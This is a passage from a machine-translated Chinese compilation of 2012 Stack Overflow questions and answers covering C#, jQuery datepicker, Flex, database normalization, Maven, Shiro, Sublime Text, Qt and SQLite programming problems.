它只是受变量影响的节点数组。节点类不是很大：

浮动 x; 4 B 浮动 y；4 B 浮动 z；4 B int[] con; int[6] 4*6=24 B 字节传递；1 B 颜色 col; 32 乙 = 4 乙

```
 Total:  41B 
```

创建三角形所需的节点序列和为 n(n+1)/2

28岁内存不足

28*29/2=406 个节点

总内存：

41*406 = 16646 B = 16.26 kB

31 时溢出：496 个节点为 19.9 kB

我确实读过关于“内存不足异常”的文章，结构大小比看起来要大，内存不足发生在 500MB 的大小......我的小三角形不可能达到如此巨大的大小。

这是我的全班：

```
class TriMatrix
    {
        int len;
        int Lenght;
        Node[] node;
        VertexPositionColor[] vertex;

        public class Node
        {
            public float x;
            public float y;
            public float z;
            public int[] con;
            public byte pass;
            public Color col;
            public Node(byte passable)
            {
                pass = passable;
                if (pass > 0)
                { col = Color.Green; }
                else
                { col = Color.DarkRed; }
                x = 0;
                z = 0;
                con = new int[6];
            }
        }

        public TriMatrix(int lenght)
        {
            len = lenght;
            Lenght = 0;
            byte pass;
            Random rnd = new Random();
            for (int i = 0; i <= len; i++)
            {
                Lenght += Lenght + 1;
            }
            node = new Node[Lenght];
            int num = 0;
            for (int i = 0; i < len; i++)
            {
                for (int j = 0; j <= i; j++)
                {

                    if (rnd.Next(0, 5) > 0) { pass = 1; } else { pass = 0; }
                    node[num] = new Node(pass);
                    node[num].x = (float)i - (float)j / 2.0f;
                    node[num].y = 0;
                    node[num].z = (float)j * 0.6f;
                    if (i < len - 1) { node[num].con[0] = num + i; } else { node[num].con[0] = -1; node[num].col = Color.Violet; }
                    if (i < len - 1) { node[num].con[1] = num + i + 1; } else { node[num].con[1] = -1; }
                    if (j < i) { node[num].con[2] = num + 1; } else { node[num].con[2] = -1; node[num].col = Color.Violet; }
                    if (j < i) { node[num].con[3] = num - i; } else { node[num].con[3] = -1; }
                    if (i > 0) { node[num].con[4] = num - i - 1; } else { node[num].con[4] = -1; }
                    if (i > 0) { node[num].con[5] = num - 1; } else { node[num].con[5] = -1; }
                    if (j == 0) { node[num].col = Color.Violet; }
                    num++;
                }
            }
        }

        public void Draw(Effect effect, GraphicsDevice graphics)
        {
            VertexPositionColor[] verts = new VertexPositionColor[3];
            int num = 0;
            for (int i = 0; i < len-1; i++)
            {
                for (int j = 0; j <= i; j++)
                {
                    foreach (EffectPass pass in effect.CurrentTechnique.Passes)
                    {
                        pass.Apply();

                        verts[0] = new VertexPositionColor(new Vector3(node[num].x, node[num].y, node[num].z), node[num].col);
                        verts[1] = new VertexPositionColor(new Vector3(node[num + i + 1].x, node[num + i + 1].y, node[num + i + 1].z), node[num + i + 1].col);
                        verts[2] = new VertexPositionColor(new Vector3(node[num + i + 2].x, node[num + i + 2].y, node[num + i + 2].z), node[num + i + 2].col);
                        graphics.DrawUserPrimitives<VertexPositionColor>(PrimitiveType.TriangleStrip, verts, 0, 1);

                        if ( j < i)
                        {
                            verts[0] = new VertexPositionColor(new Vector3(node[num].x, node[num].y, node[num].z), node[num].col);
                            verts[1] = new VertexPositionColor(new Vector3(node[num + i + 2].x, node[num + i + 2].y, node[num + i + 2].z), node[num + i + 2].col);
                            verts[2] = new VertexPositionColor(new Vector3(node[num + 1].x, node[num + 1].y, node[num + 1].z), node[num + 1].col);
                            graphics.DrawUserPrimitives<VertexPositionColor>(PrimitiveType.TriangleStrip, verts, 0, 1);
                        }
                    }
                    num++;
                }
            }
        }
    }// endclass 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-10-12T21:16:56.357

我假设您的错误位于此循环中（冒昧更正您的拼写）：

```
for (int i = 0; i <= len; i++)
{
    Length += Length + 1;
} 
```

在循环中，您将`Length` *自身*的值加一。这实际上意味着您将`Length`每次迭代的值加倍，从而导致指数增长。

在最初的几次迭代中， 的值`Length`将是：1, 3, 7, 15, 31, 63, ...。我们可以推广这个序列，使得在迭代*i*时， 的值`Length`将是 2 ^(*i* +1) -1。在第 28 次迭代中，这将是 536,870,911。在第 31 次迭代中，这将是 4,294,967,295。

**编辑**：正如您在下面的评论中提到的，计算三角形长度网格中元素数量的正确`len`方法是：

```
for (int i = 1; i <= len; i++)
{
    Length += i;
} 
```

这相当于求和`1 + 2 + 3 + … + len`，计算所谓的[三角数](http://en.wikipedia.org/wiki/Triangular_number)。可以使用以下公式简洁地计算：

```
Length = len * (len + 1) / 2; 
```

这个数字增长如此之大的原因是它是一个平方关系；对于一条边的长度`n`，你需要大约一半的面积`n²`。

# jquery - jquery datepicker get minDate（格式化为 mm/dd/yyyy）

> ID：12866943
> 
> 赞同：0
> 
> 时间：2012-10-12T20:52:57.190
> 
> 标签：jquery, jquery-ui-datepicker

使用 jQuery datePicker，我将 minDate 设置为“-3y”。

当我打电话时：

```
$mydatepicker.datepicker("option", "minDate") 
```

我明白了

```
-3y 
```

是否可以使用 datePicker 方法将其获取为 mm/dd/yyyy？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-12T21:55:52.263

不幸的是，datepicker 不提供处理相对日期的公共 API，只提供执行此操作的内部方法。
考虑计算 minDate 服务器端——这就是我最终要做的。

如果您仍然绝对需要它：

```
// DO NOT USE THIS IN PRODUCTION CODE!!
var minDate = $.datepicker._getMinMaxDate( $mydatepicker.data('datepicker'), 'min' ),
    zeroPad = function( toPad, padToLength ) {
        toPad = toPad.toString();
        var i = toPad.length;
        while( i < padToLength  )
            toPad = '0' + toPad, i++;

        return toPad;
    }
    formattedMinDate = zeroPad( minDate.getMonth(), 2 ) + '/'
                       zeroPad( minDate.getDay(), 2 ) + '/'
                       minDate.getFullYear(); 
```

**请注意，上面的代码是 -bad-**并且您**不**应该使用它，因为它依赖于将来可能会在不通知的情况下消失的私有方法。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-10-12T20:56:38.633

你应该做

```
var date = $mydatepicker.datepicker({ dateFormat: 'dd-mm-yy' }).val(); 
```

或者，您还可以执行以下操作：

```
var date = $mydatepicker.datepicker('getDate');
$.datepicker.formatDate('dd-mm-yy', date); 
```

如果你想要它作为一个对象，你可以删除`.val()`

更多信息可在[http://docs.jquery.com/UI/Datepicker/formatDate](http://docs.jquery.com/UI/Datepicker/formatDate) 和[jQuery UI DatePicker - 更改日期格式](https://stackoverflow.com/questions/1328025/)

# actionscript-3 - mx:ViewStack 中组的宽度

> ID：12866944
> 
> 赞同：1
> 
> 时间：2012-10-12T20:52:59.017
> 
> 标签：actionscript-3, apache-flex

我有一个简单的应用程序：

```
<s:Application xmlns:fx="http://ns.adobe.com/mxml/2009" 
           xmlns:s="library://ns.adobe.com/flex/spark" 
           xmlns:mx="library://ns.adobe.com/flex/mx" xmlns:local="*">

    <mx:ViewStack width="100%" creationPolicy="all">
        <s:NavigatorContent width="100%">
            <local:TestGroup width="100%"/>
        </s:NavigatorContent>
        <s:NavigatorContent width="100%">
            <local:TestGroup width="100%"/>
        </s:NavigatorContent>
    </mx:ViewStack>

</s:Application> 
```

我`TestGroup`是一个光秃秃的 Spark 组。它具有 creationComplete 方法，其中跟踪组的宽度：

```
<s:Group xmlns:fx="http://ns.adobe.com/mxml/2009" 
         xmlns:s="library://ns.adobe.com/flex/spark" 
         xmlns:mx="library://ns.adobe.com/flex/mx" creationComplete="group1_creationCompleteHandler(event)">
    <fx:Script>
        <![CDATA[
            import mx.events.FlexEvent;

            protected function group1_creationCompleteHandler(event:FlexEvent):void
            {
                trace("internal group width: " + this.width)
            }

        ]]>
    </fx:Script>
</s:Group> 
```

当我运行应用程序时，第一个`TestGroup`宽度为 1600（大约是正确的），但第二个宽度`creationPolicy="all"`为`width="100%"`0（零）。

事实证明，`ms:ViewStack`除了选定的组件之外，它没有设置组件的宽度。

这种行为背后的逻辑是什么？
如何修复它，以便我的第二组具有真正的宽度，并且我可以在创建完成时获得它？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-18T09:04:38.607

ViewStack 是一个多视图容器。即使将 creationComplete 设置为 all （顺便说一下**，仅适用于单视图容器**），Flex也**仅**实例化最初对 ViewStack 可见的控件。为了实现您的目标，请尝试使用 ViewStack 之外的其他容器。

可以在此处找到更多详细信息：http: //livedocs.adobe.com/flex/3/html/help.html?content= [layoutperformance_05.html](http://livedocs.adobe.com/flex/3/html/help.html?content=layoutperformance_05.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-18T09:52:22.677

> 这种行为背后的逻辑是什么？

因为不需要渲染`TestGroup`元素。如果你`creationPlicy`为`all`一个弹性容器设置会创建内部元素，但这并不意味着容器会为元素设置大小。

> 如何修复它，以便我的第二组具有真正的宽度，并且我可以在创建完成时获得它？

使用事件`updateComplete`。`updateComplete`每当组件的布局、位置、大小或其他视觉特征发生变化并且组件被更新以供显示时，Flex 就会调度事件。所以当你`TestGroup`第一次选择第二个时你会得到它。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-24T09:27:52.090

您可以收听更改事件，每次所选组更改时都会触发该事件。

只有当前活动组会给你她真正的宽度，所以你可以做一些这样的事情

```
<s:Application xmlns:fx="http://ns.adobe.com/mxml/2009" 
           xmlns:s="library://ns.adobe.com/flex/spark" 
           xmlns:mx="library://ns.adobe.com/flex/mx" xmlns:local="*">

    <fx:Script>
        <![CDATA[
            import mx.events.FlexEvent;

            protected function onChange(event:Event):void
            {
                if(myViewStack.selectedChild){
                    myViewStack.selectedChild.initMyGroup();  
                }
            }

        ]]>
    </fx:Script>

    <mx:ViewStack id="myViewStack" width="100%" creationPolicy="all" change="onChange()">
        <s:NavigatorContent width="100%">
            <local:TestGroup width="100%"/>
        </s:NavigatorContent>
        <s:NavigatorContent width="100%">
            <local:TestGroup width="100%"/>
        </s:NavigatorContent>
    </mx:ViewStack>

</s:Application>

<s:Group xmlns:fx="http://ns.adobe.com/mxml/2009" 
         xmlns:s="library://ns.adobe.com/flex/spark" 
         xmlns:mx="library://ns.adobe.com/flex/mx">
    <fx:Script>
        <![CDATA[
            import mx.events.FlexEvent;

            public function initMyGroup():void
            {
                trace("internal group width: " + this.width)
            }

        ]]>
    </fx:Script>
</s:Group> 
```

# database - 规范化表 6

> ID：12866951
> 
> 赞同：4
> 
> 时间：2012-10-12T20:53:22.467
> 
> 标签：database, database-design, normalization, database-normalization

我正在整理一个需要规范化的数据库，但我遇到了一个我真的不知道如何处理的问题。

我整理了一个简化的问题示例来说明它：

```
Item ID___Mass___Procurement__Currency__________Amount
0__________2kg___inherited____null________________null
1_________13kg___bought_______US dollars_________47.20  
2__________5kg___bought_______British Pounds______3.10
3_________11kg___inherited____null________________null   
4__________9kg___bought_______US dollars__________1.32 
```

（我为尴尬的桌子道歉；不允许新用户粘贴图像）

在上表中，我有一个属性（金额），它在功能上取决于项目 ID（我认为），但并非每个项目 ID 都存在（因为继承的项目没有货币成本）。我对数据库比较陌生，但我在任何初学者教程或文献中都找不到与此类似的问题。任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-12T22:55:09.973

我只会创建两个新表`ItemProcurement`和`Currencies`.

如果我没记错的话，根据提供的数据，金额是项目本身采购的一部分（当项目没有被继承时），因此我会将`Amount`and`CurrencyID`字段分组到新实体`ItemProcurement`中。

如您所见，继承的项目在`ItemProcurement`表中不会有条目。

关于主`Item`表，如果您希望采购类型只有两个不同的值，那么我会使用一个`char(1)`列（不同于`B`=> bougth，`I`=> 继承）。

我看起来像这样：

![在此处输入图像描述](../Images/7c1967fdfdd918e9da315d6c0a235065.png)

然后数据将如下所示：

```
TABLE Items
+-------+-------+--------------------+
|    ID |  Mass |  ProcurementMethod |
|-------+-------+--------------------+
|     0 |     2 |                  I | 
+-------+-------+--------------------+
|     1 |    13 |                  B | 
+-------+-------+--------------------+
|     2 |     5 |                  B | 
+-------+-------+--------------------+

TABLE ItemProcurement
+--------+-------------+------------+
| ItemID |  CurrencyID |     Amount |
|--------+-------------+------------+
|     1  |         840 |      47.20 | 
+--------+-------------+------------+
|     2  |         826 |       3.10 | 
+--------+-------------+------------+

TABLE Currencies
+------------+---------+-----------------+
| CurrencyID | ISOCode |     Description |
|------------+---------+-----------------+
|        840 |     USD |      US dollars | 
+------------+---------+-----------------+
|        826 |     GBP |  British Pounds | 
+------------+---------+-----------------+ 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-12T21:25:58.440

这是我的即兴建议：

更新：质量将是浮点数/十进制/双精度数，具体取决于您的数据库，成本将是处理金钱的最佳类型（在 SQL Server 2008 中，它是“金钱”，但这些东西会有所不同）。

另一个更新：继承项目的成本应该为零，而不是零（事实上，有时会有间接成本，以税收的形式，但我离题了......）。因此，您的项目表应该需要一个成本值，即使该成本为零。它不应该为空。

如果您有任何问题，请告诉我。. .

![在此处输入图像描述](../Images/7de96319f7c2bb8c882647887bc28540.png)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-12T21:55:29.600

不仅`Amount`，一切都依赖于`ItemID`，因为这似乎是一个候选键。

当是（或@XIVsolutions 指出的0 成本并且正如您提到的*“继承的项目没有货币成本”*`Currency` ）时，您所拥有的依赖`Amount`是`NULL`（我猜这意味着未知/无效）`Procurement``'inherited'`

 *换句话说，iem 被分为两种类型（采购），两种类型之一的项目不具有所有属性。

这可以通过超类型/子类型拆分来解决。您有一个超类型表 ( `Item`) 和两个子类型表 (`ItemBought`和`ItemInherited`)，其中每一个都`1::0..1`与超类型表有关系。所有项目共有的属性将在超类型表中，而在相关子类型表中的所有其他属性：

```
Item
----------------------------
ItemID    Mass   Procurement
0          2kg   inherited
1         13kg   bought
2          5kg   bought
3         11kg   inherited 
4          9kg   bought

ItemBought
---------------------------------
ItemID    Currency         Amount
1         US dollars       47.20  
2         British Pounds    3.10 
4         US dollars        1.32

ItemInherited
-------------
ItemID
0       
3 
```

## 如果没有只有继承项具有的属性，您甚至可以`ItemInherited`完全跳过该表。

对于与此模式相关的其他问题，请查看标签：Class-Table-Inheritance。当您使用它时，请同时查找 Shared-Primary-Key。如需更具体的处理，请在“ER 专业化”上搜索。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-10-13T07:56:27.987

为什么需要对其进行规范化？

我可以看到一些数据完整性挑战，但没有明显的结构性问题。

“采购”与是否存在价值/货币之间的隐含依赖关系很棘手，但与密钥无关，因此实际上并不是什么大问题。

如果我们要成为纯粹主义者（例如，这是出于家庭作业的目的），那么我们将处理两种类型的物品，继承物品和购买物品。由于它们不是同一类型的东西，它们应该被建模为两个独立的实体，即 InheritedItem 和 BoughtItem，只有它们需要的列。

为了获得所有项目的组合视图（例如，获得总重量），您将使用视图或 UNION sql 查询。

如果我们正在寻找数据库中的对象模型，那么我们可以分解出常见的超类型（Item），并使用外键对超类型表的子类型（InheritedItem，BoughtItem）进行建模（下面的ypercube解释非常好），但是与仅对子类型进行建模相比，这非常复杂，而且对未来的影响更小。

最后一点是很多争论的主题，但实际上，根据我的经验，在数据库中对具体的超类型进行建模比让它们抽象化会导致更多的痛苦。好的，这可能超出了您的要求:)。*

# maven - 范围“提供”在 Maven 中给出了安装错误

> ID：12866954
> 
> 赞同：3
> 
> 时间：2012-10-12T20:53:28.947
> 
> 标签：maven

我正在尝试从提供 POM 的 sourceforge (jtmt.sf.net) 安装 Maven 发行版。然而

```
mvn install 
```

抛出错误：

```
[ERROR]     'build.plugins.plugin[org.mortbay.jetty:maven-jetty6-plugin].depende
ncies.dependency.scope' for org.apache.geronimo.specs:geronimo-j2ee_1.4_spec:jar
 must be one of [compile, runtime, system] but is 'provided'. @ line 653, column
 20 
```

pom包含代码：

```
 <!-- For web development with Jetty6 -->
  <plugin>
    <groupId>org.mortbay.jetty</groupId>
    <artifactId>maven-jetty6-plugin</artifactId>
    <configuration>
      <scanIntervalSeconds>10</scanIntervalSeconds>
      <connectors>
        <connector implementation="org.mortbay.jetty.nio.SelectChannelConnector">
          <port>8081</port>
          <maxIdleTime>60000</maxIdleTime>
        </connector>
      </connectors>
    </configuration>
    <dependencies>
      <dependency>
        <groupId>org.apache.geronimo.specs</groupId>
        <artifactId>geronimo-j2ee_1.4_spec</artifactId>
        <version>1.0</version>
        <scope>provided</scope>
      </dependency>
    </dependencies>
  </plugin> 
```

我假设 POM 过去工作过，尽管该项目现在有点休眠。

安装时我应该设置一些开关吗？（我正在使用 mvn 3.0.3）。FWIW 发行版已经在`lib/`.

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-10-12T21:05:57.743

该项目可能正在使用 Maven 2。Maven 3 对插件中的范围更加挑剔，并且`provided`插件依赖项中不再允许范围。你可以试试：

*   完全删除依赖项并重建（范围`provided`意味着无论如何都应该使它可用）
*   仅删除`<scope>`标签（使其成为简单的`compile`依赖项）
*   如果没有任何帮助，您可以尝试使用 Maven 2 构建它

现在插件中不允许使用的原因`provided`是，这`provided`实际上是针对运行时环境（例如应用服务器）提供的依赖项。Jetty 是一个特例——它是一个经常作为插件使用的应用服务器。

# java - 为什么 ShiroWebModule 默认为非验证 SessionManager？

> ID：12866956
> 
> 赞同：0
> 
> 时间：2012-10-12T20:53:45.163
> 
> 标签：java, jersey, guice, shiro

`ServletContainerSessionManager`不是`ValidatingSessionManager`; 它是否遵循底层容器来处理孤儿清理？这似乎不对。

我假设切换到`DefaultWebSessionManager`，因为它是一个功能齐全的实现，不会有风险或缺点？有什么理由不是这个模块的默认设置吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-12T22:50:03.793

`ServletContainerSessionManager`确实为所有与会话相关的功能都遵从容器。 `ShiroWebModule`默认为这个只是因为这是已经预期的`DefaultWebSecurityManager`默认值 - 无论您使用的是基本的 ini 设置、spring 还是 guice，目的都是保持默认值相同。

话虽如此，如果您需要在 Shiro 中管理会话，则没有理由不切换到`DefaultWebSessionManager`. 确实，这就是该`bindSessionManager`方法存在的原因。

要切换，只需覆盖`bindSessionManager`：

```
@Override
protected void bindSessionManager(AnnotatedBindingBuilder<SessionManager> bind) {
    bind.to(DefaultWebSessionManager.class).asEagerSingleton();
} 
```

# javascript - Sublime Text 2：自动修复 javascript 的缩进？

> ID：12866964
> 
> 赞同：73
> 
> 时间：2012-10-12T20:54:18.580
> 
> 标签：javascript, sublimetext2

这是我的一些示例代码，目前我设置为一次仅使用 4 个空格缩进。有没有办法突出显示一段 javascript 并按下一个按钮或菜单选项来很好地格式化它，如下所示：

前：

```
app.get('/csvtest', function (req, res) {
  MyModel.find(function (err, mymodel) {
    if (!err) {
      var csv = [];
      _.each(mymodel, function(obj) {
       csv.push(obj['mymodel']);
      });
      res.send(csv.join());
    } else {
      console.log(err);
    }
  });
}); 
```

后：

```
app.get('/csvtest', function (req, res) {
    MyModel.find(function (err, mymodel) {
        if (!err) {
            var csv = [];
            _.each(mymodel, function(obj) {
                csv.push(obj['mymodel']);
            });
            res.send(csv.join());
        } else {
            console.log(err);
        }
    });
}); 
```

* * *

## 回答 #1

> 赞同：148
> 
> 时间：2012-10-12T21:00:21.923

[这](https://github.com/jdc0589/JsFormat)是一个工具。[在崇高的论坛](http://www.sublimetext.com/forum/viewtopic.php?f=5&t=2430)上找到它。

*   [安装包控制](https://sublime.wbond.net/installation)
*   运行包控制：从命令面板安装包。键入`Ctrl`+ `Shift`+ `P`(Windows) 或`Command`+ `Shift`+`P`打开命令面板
*   搜索`jsFormat`并按回车
*   `Ctrl`+ `Alt`+`f`格式化

* * *

## 回答 #2

> 赞同：39
> 
> 时间：2012-10-12T21:00:39.493

你可以[试试 JsFormat](https://github.com/jdc0589/JsFormat)。`ctrl`++`alt`格式化`f`所选文本。

* * *

## 回答 #3

> 赞同：37
> 
> 时间：2013-06-24T23:41:39.657

您可以**选择所有代码**( `ctrl`+ `A`) 并使用应用内功能**Reindent (Edit -> Line -> Reindent)**。它将通过查看 Sublime 的选项卡/意图设置来格式化您的代码。

**或者：**如果您希望在 Sublime Text 的默认制表符/缩进设置之外对如何格式化代码进行更多可自定义的设置，您可以使用Sublime Text 2 的[**JsFormat格式化插件。**](https://github.com/jdc0589/JsFormat)

[https://github.com/jdc0589/JsFormat](https://github.com/jdc0589/JsFormat)

**更多关于如何将 JsFormat 安装到您的 Sublime IDE 的信息：** 您可以使用 Package Control (Preferences -> Package Control) 轻松安装 JsFormat 打开 package control，然后键入 install，回车。然后输入“js format”并点击`enter`，你就完成了。（包控制器会在 Sublime 的左下栏显示安装成功和错误的状态）

**设置快捷方式：**将以下行添加到您的键绑定（Preferences -> Key Bindings User）

```
{ "keys": ["ctrl+alt+2"], "command": "js_format"} 
```

我正在使用`ctrl`++ ，您可以`alt`随意`2`更改此快捷键。

**我的意见：** JsFormat 不错，绝对值得一试！

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2012-10-12T21:03:37.440

如果您特别想从 2 到 4 个空格，请单击右下角的选项卡菜单。单击“将缩进转换为制表符”，将宽度更改为 4，然后“将缩进转换为空格”。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2015-02-04T14:12:40.243

一般来说，最快的方法是使用正则表达式：

*   按`CTRL`+`H`
*   启用左下角的*正则表达式*`ALT`按钮（或按+ `R`）
*   输入`^(\s+)`查找*内容*
*   输入`\1\1`替换*为*
*   点击`Replace All`右侧

这将使前缀空格的数量增加一倍（将 2 个空格变为 4 个）。然后可以将替换窗口保持打开状态，以便轻松地将其应用于多个文件。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2016-02-18T20:11:06.277

看起来 Sublime Text 2 已经有了你想要的东西（也许他们最近添加了这个功能）。

无论您是想更改空格的数量还是想将空格转换为制表符，都可以使用以下路径：**查看 > 缩进**

在该下拉菜单中，您可以选择**将缩进转换为制表符**，**将缩进转换为空格，或选择****制表符宽度 (1-8)**应为多少个空格。

希望这可以帮助！

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2015-05-22T19:24:44.277

通过从**Install Package**[菜单](https://packagecontrol.io/installation)中选择 jsFormat，使用PackageControl 安装 jsFormat。

 **然后执行此操作以自动格式化您的代码：

`Ctrl`+ `Alt`+`F`

查看 jsLint 格式建议也很有帮助。您可以安装 jsLint 包并启用格式选项进行验证。

`Ctrl`+`L`**

# c# - try catch 块中的异常优先级

> ID：12866967
> 
> 赞同：3
> 
> 时间：2012-10-12T20:54:27.067
> 
> 标签：c#, .net, exception, resharper

我正在制作一个图书馆，以便其他人可以使用，我想让它防弹（如果这是正确的术语）。在下面的代码中，我想检查`byte`一个字节数组的索引 8。如果库用户提供的字节长度小于 9，我想警告用户。考虑以下代码：

```
 try
    {
        int payloadSizeFromByteArray = Packet[8];
    }
    catch(IndexOutOfRangeException)
    {
        throw new IndexOutOfRangeException("Packet is not valid. Does noe contains byte at index 8 which stores incoming payload length.");
    }
    catch (Exception)
    {
        throw;
    } 
```

ReSharper 说最后一个 catch 块是多余的。我无法理解，为什么？！这是否意味着没有机会到达最后一个 catch 块？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-12T20:56:08.360

这是多余的，因为您在最后一次捕获中没有做任何事情。 `throw;`是通常会发生的事情。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-10-12T20:56:13.173

这是因为你没有做任何例外的事情。

你只是“重新扔”它。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-10-12T21:01:00.217

如前所述，这是因为您只是在重新抛出它。我要补充两点：

```
try { ... }
catch( IndexOutOfBoundsException e )
{
 throw new IndexOutOfBoundsException ("your message", e);
} 
```

我会添加原始异常

一般来说，我会改变它，在函数的开头我会添加

```
Contract.Requires( Packet.Length == 8, "your message)" ); 
```

这还将添加一些编译时检查（代码合同），并且还避免了之前已知的异常。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-10-12T20:56:49.373

它不是优先问题。

它是多余的，因为仅抛出相同的异常就等于该块不存在。

# c# - 根据文件是否存在刷新控件样式

> ID：12866978
> 
> 赞同：0
> 
> 时间：2012-10-12T20:55:39.523
> 
> 标签：c#, wpf, xaml

我有以下用于显示文件的 xaml。如果文件存在于本地机器上，它是一个可点击的超链接，否则只是一个普通的文本块。

```
 <TextBlock Visibility="{Binding FileName, Converter={StaticResource fileExistsConverter}}" Grid.Column="2" TextDecorations="Underline" Margin="5,0,0,0" Foreground="Black" Text="{Binding FileName}" />
    <TextBlock Margin="5,0,0,0" Grid.Column="2" Visibility="{Binding FileName, Converter={StaticResource fileDoesntExistConverter}}">
        <Hyperlink Click="Hyperlink_Click_1">
            <TextBlock Text="{Binding FileName}" />
        </Hyperlink>
    </TextBlock> 
```

这适用于页面加载，但在打开窗口时不会更新，例如下载列出的文件之一。我将如何触发刷新以便 XAML 可以交换样式？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-12T21:44:34.423

资源 ：

```
 <Style x:Key="SwapTemplateStyle" TargetType="ContentControl">

       <Setter Property="Template">
            <Setter.Value>
                <ControlTemplate TargetType="ContentControl">
                    <TextBlock />
                </ControlTemplate>                                                       
            </Setter.Value>
        </Setter>

        <Style.Triggers>
            <DataTrigger Binding="{Binding IsExist}" Value="True">
                <Setter Property="Template">
                    <Setter.Value>
                        <ControlTemplate TargetType="ContentControl">                                
                              <Hyperlink>
                                 <TextBlock />
                              </Hyperlink>
                        </ControlTemplate>
                    </Setter.Value>
                </Setter>
            </DataTrigger>                
        </Style.Triggers>
   </Style> 
```

在你看来：

```
 <ContentControl Style="{StaticResource SwapTemplateStyle}" /> 
```

# windows - 在 Windows 上使用 Qt 删除当前加载的文件

> ID：12866981
> 
> 赞同：0
> 
> 时间：2012-10-12T20:56:03.977
> 
> 标签：windows, qt, file, delete-file

我正在尝试删除我的应用程序在卸载期间创建的所有临时文件。我使用以下代码：

```
 bool DeleteFileNow( QString filenameStr )
    {
        wchar_t* filename;
        filenameStr.toWCharArray(filename);

        QFileInfo info(filenameStr);

        // don't do anything if the file doesn't exist!
        if (!info.exists())
            return false;

        // determine the path in which to store the temp filename
        wchar_t* path;
        info.absolutePath().toWCharArray(path);

        TRACE( "Generating temporary name" );
        // generate a guaranteed to be unique temporary filename to house the pending delete
        wchar_t tempname[MAX_PATH];
        if (!GetTempFileNameW(path, L".xX", 0, tempname))
            return false;

        TRACE( "Moving real file name to dummy" );
        // move the real file to the dummy filename
        if (!MoveFileExW(filename, tempname, MOVEFILE_REPLACE_EXISTING))
        {
            // clean up the temp file
            DeleteFileW(tempname);
            return false;
        }

         TRACE( "Queueing the OS" );
        // queue the deletion (the OS will delete it when all handles (ours or other processes) close)
        return DeleteFileW(tempname) != FALSE;
    } 
```

我的应用程序崩溃了。我认为这是由于执行的操作缺少一些 windows dll。有没有其他方法可以单独使用 Qt 执行相同的操作？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-12T21:56:01.753

Roku 已经告诉您在使用 QString 和 wchar_t* 操作时遇到的问题。请参阅文档：[QString 类参考，方法 toWCharArray](http://qt-project.org/doc/qt-4.8/qstring.html#toWCharArray)：

```
int QString::toWCharArray ( wchar_t * array ) const 
```

> 用此 QString 对象中包含的数据填充数组。该数组在 wchar_t 为 2 字节宽的平台（例如 windows）上以 utf16 编码，在 wchar_t 为 4 字节宽的平台（大多数 Unix 系统）上以 ucs4 编码。
> 
> **数组必须由调用者分配并包含足够的空间来保存完整的字符串**（分配与字符串长度相同的数组总是足够的）。
> 
> 返回数组中字符串的实际长度。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-12T21:12:19.240

如果您只是在寻找一种使用 Qt 删除文件的方法，请使用[`QFile::remove`：](http://qt-project.org/doc/qt-4.8/qfile.html#remove)

```
QFile file(fileNameStr);
file.remove(); // Returns a bool; true if successful 
```

如果您希望 Qt 为您管理临时文件的整个生命周期，请查看[`QTemporaryFile`](http://qt-project.org/doc/qt-4.8/qtemporaryfile.html)：

```
QTemporaryFile tempFile(fileName);
if (tempFile.open())
{
   // Do stuff with file here
}

// When tempFile falls out of scope, it is automatically deleted. 
```

# sqlite - 将 SQLite 保存到文档文件夹

> ID：12866986
> 
> 赞同：1
> 
> 时间：2012-10-12T20:56:24.307
> 
> 标签：sqlite, blackberry-webworks, playbook

我需要选择一种底层方法来保存在现场（离线和远程位置）收集的数据。我想将 HTML5 数据库与 SQLite 一起使用，但我可以选择位置吗？到目前为止，我还无法做到这一点。这是我使用的一些示例代码：

```
var dbName = "";

var Dir = blackberry.io.dir;
var path = Dir.appDirs.shared.documents.path;
dbName = path + "/" + "databasetest.db";  

var db = openDatabase(dbName, '1.0', 'Test', 50 * 1024); 
```

我使用“alert()”来查看文件是“应该”创建的，但是当我在资源管理器中打开该文件夹时，我找不到它。不太确定为什么并提出我的问题。

我的应用程序是用于数据输入的，没有详细说明，用户最终可能会收集很多或很少的数据。但我想要一些下载 SQLite 数据库的方法？

这是 SQLite 数据库的意图，还是我必须使用其他解决方案？

谢谢！

克里斯

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-13T10:27:13.123

[Web SQL 数据库规范](http://www.w3.org/TR/webdatabase/)是为不适合允许网页访问任意文件路径的浏览器设计的。

下载数据的预期方法是将其上传到云中的 Web 服务器。

如果您想知道数据库的文件名，请尝试执行[`PRAGMA database_list`](http://www.sqlite.org/pragma.html#pragma_database_list). （您的应用程序是否可以访问该路径是另一个问题。）

# java - 如何将eclipse jdt jar库放入Java Build Path？

> ID：12866991
> 
> 赞同：4
> 
> 时间：2012-10-12T20:56:37.533
> 
> 标签：java, eclipse, jar, classpath

![在此处输入图像描述](../Images/3b26ff6d2003a4969f3664f6339404a0.png)

我正在尝试使用 eclipse `jdt`，并尝试在 java 源文件中导入相关模块。

我有一堆错误，因为 jdt 库不在 Java 构建路径中。

![在此处输入图像描述](../Images/ebc0564eaa01dcc5c249075a2400ca93.png)

我试图打开`Add Libary -> Plug-in Dependencies`，但它没有 jdt jar 文件。

![在此处输入图像描述](../Images/712ad2669b5745c39c0a3d8b8c21cb67.png)

